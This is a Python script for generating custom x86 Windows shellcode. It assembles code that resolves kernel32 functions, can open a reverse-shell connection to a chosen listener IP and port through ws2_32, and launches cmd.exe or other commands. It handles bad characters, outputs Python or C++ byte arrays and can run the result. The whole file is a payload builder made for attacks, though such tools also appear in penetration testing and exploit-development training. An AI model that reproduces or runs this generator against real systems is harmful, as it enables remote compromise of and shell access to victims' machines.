"""
Generate custom shellcode payloads in x86.

Author: wh1rl3y
Date: 2025-07-07
"""
import ctypes, struct, textwrap
from keystone import *
import sys

import argparse
from utils import *

parser = argparse.ArgumentParser(description='Command generator script')
parser.add_argument('-c', '--command', action='append', default=[], 
                   help='Commands to execute (can be used multiple times)')
parser.add_argument('-l', '--lhost', type=str, help='Local host IP address')
parser.add_argument('-p', '--lport', type=int, help='Local port number')
parser.add_argument('-v', '--verbose', action='store_true', help='Enable debug printing')
parser.add_argument('-var', '--variable', type=str, default='buf', help='Variable name to be used')
parser.add_argument('-lang', '--language', type=str, choices=['python', 'c++'], default='python',
                   help='Output programming language (python or c++)')
parser.add_argument('-a', '--assembly', action='store_true', help='Print assembly in full', default=False)
parser.add_argument('-e', '--execute', action='store_true', help='Execute commands after building', default=False)
parser.add_argument('-f', '--force_break', action='store_true', help='Add int 3 to assembly to break on start', default=False)
parser.add_argument('-b', '--bad_char', action='append', nargs=2, metavar=('HEX', 'METHOD'),
                   help='Bad character with hex value and method (neg/add[n]/dec[n])')

args = parser.parse_args()

# Handle default command if none provided
if not args.command:
   args.command = ['cmd.exe']




asm_code = create_asm_start(args.force_break)
asm_code += find_kernel32_and_resolve_functions()

if args.lhost and args.lport:
    print_info(f'Creating a reverse shell payload', SUCCESS, 0, True)
    ip_hex = get_ip_hex(args.lhost)
    port_hex = get_port_hex(args.lport)

    print_info (f'The target IP:', SUCCESS, 0, True)
    print_info (f'{ip_hex} : {args.lhost}', SUCCESS, 1, True)
    print_info (f'The target port:', SUCCESS, 0, True)
    print_info (f'{port_hex} : {args.lport}', SUCCESS, 1, True)
    if len(args.command) > 1:
        print_info(f'Only one command is allowed for a reverse shell', FAIL, 0, True)
        sys.exit()

    asm_code += load_ws2_32_and_resolve_symbols()
    asm_code += create_socket_and_connect(ip_hex, port_hex)
elif args.lhost or args.lport:
    print_info(f'Please provide both lport and lport', FAIL, 0, True)
    sys.exit()
else:
    print_info(f'Creating a command ONLY payload', SUCCESS, 0, True)

bad_char_list = [['00', 'neg']]
if args.bad_char:
    bad_char_list = args.bad_char

count = 0
for command in args.command:    
    print_info (f'Adding command:', SUCCESS, 0, True)
    print_info (f'{command}', SUCCESS, 1, True)
    cmd_chunks = change_command_to_memory_hex(command, bad_char_list, args.verbose)
    asm_code += create_startup_info_a(count)
    asm_code += create_command_string(cmd_chunks, count, args.verbose)
    asm_code += create_process_a(count)
    count += 1

ks = Ks(KS_ARCH_X86, KS_MODE_32)
force_assembly = False

try:
    encoding, count = ks.asm(asm_code)
    print_info (f"Encoded {count} instructions", SUCCESS, 0, True)
except: 
    print_info (f'Failed to compile the assembly:', FAIL, 0, True)
    force_assembly = True

if args.assembly or force_assembly:
    print_info (f'Assembly:', SUCCESS, 1, args.verbose)
    print_asm (asm_code)


sh = b""
for e in encoding:
    sh += struct.pack("B", e)

shellcode = bytearray(sh)                   

print_info (f'Shellcode:', SUCCESS, 0, True)
print_shellcode(shellcode, args.language)

if args.execute:
   execute_shellcode(shellcode)
